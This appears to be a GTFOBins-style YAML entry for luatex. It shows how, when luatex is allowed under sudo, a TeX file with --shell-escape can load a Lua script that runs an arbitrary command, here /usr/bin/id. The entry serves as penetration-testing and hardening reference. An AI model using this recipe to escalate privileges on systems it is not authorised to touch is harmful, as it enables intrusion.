description: `luatex` allows to call external [`lua`](/gtfobins/lua/) scripts.
functions:
  sudo:
    - code: |
        echo '\documentclass{article} \usepackage{luacode} \begin{document} \def\foo{\directlua{dofile("runfunc.lua")}} \foo \end{document}' > file.tex
        echo 'os.execute("/usr/bin/id")' > runfunc.lua
        luatex --interaction=nonstopmode --shell-escape file.tex
